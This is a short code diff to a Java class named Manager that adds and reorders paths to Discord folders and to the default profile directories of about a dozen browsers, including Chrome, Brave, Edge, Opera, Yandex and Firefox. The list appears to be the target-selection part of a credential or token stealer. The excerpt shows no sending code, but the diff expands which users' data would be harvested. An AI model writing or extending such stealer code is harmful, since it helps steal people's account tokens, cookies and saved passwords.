@@ -15,15 +15,20 @@ public class Manager {
     public ArrayList<String> paths = new ArrayList<String>();
 
     public ArrayList<String> getPaths() {
+        addPath(Paths.get(LOCAL, "360Browser", "Browser", "User Data", "Default"));
+        addPath(Paths.get(LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default"));
+        addPath(Paths.get(LOCAL, "CocCoc", "Browser", "User Data", "Default"));
+        addPath(Paths.get(LOCAL, "Epic Privacy Browser", "User Data", "Default"));
+        addPath(Paths.get(LOCAL, "Google", "Chrome Beta", "User Data", "Default"));
+        addPath(Paths.get(LOCAL, "Google", "Chrome", "User Data", "Default"));
+        addPath(Paths.get(LOCAL, "Microsoft", "Edge", "User Data", "Default"));
+        addPath(Paths.get(LOCAL, "Vivaldi", "User Data", "Default"));
+        addPath(Paths.get(LOCAL, "Yandex", "YandexBrowser", "User Data", "Default"));
+        addPath(Paths.get(ROAMING, "Opera Software", "Opera GX"));
+        addPath(Paths.get(ROAMING, "Opera Software", "Opera Stable"));
         addPath(Paths.get(ROAMING, "discord"));
         addPath(Paths.get(ROAMING, "discordcanary"));
         addPath(Paths.get(ROAMING, "discordptb"));
-        addPath(Paths.get(LOCAL, "Google", "Chrome", "User Data", "Default"));
-        addPath(Paths.get(LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default"));
-        addPath(Paths.get(LOCAL, "Yandex", "YandexBrowser", "User Data", "Default"));
-        addPath(Paths.get(LOCAL, "Microsoft", "Edge", "User Data", "Default"));
-        addPath(Paths.get(ROAMING, "Opera Software", "Opera Stable"));
-        addPath(Paths.get(ROAMING, "Opera Software", "Opera GX"));
         parseFirefoxProfiles(Paths.get(ROAMING, "Mozilla", "Firefox"));
         return paths;
     }
